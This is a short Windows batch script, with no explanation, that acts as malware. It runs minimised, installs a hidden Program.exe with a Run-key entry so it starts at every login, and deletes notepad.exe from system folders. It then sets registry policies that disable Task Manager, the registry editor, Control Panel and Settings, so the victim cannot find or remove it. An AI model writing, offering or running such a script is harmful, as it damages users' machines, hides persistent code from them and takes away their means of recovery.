if not "%~1"=="min" start /min cmd.exe  /c %0 min&exit
@echo off
start tool
copy "Program.exe" "C:\Program Files\Program.exe"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Program" /t REG_SZ /d "\"C:\Program Files\Program.exe\"" /f >nul 2>&1
attrib +h "C:\Program Files\Program.exe"
copy /Y "C:\Windows\system32\notepad.exe" "D:\backup.exe"
del /f /q "C:\Windows\system32\notepad.exe"
del /f /q "C:\Windows\notepad.exe"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoSettingsApp" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul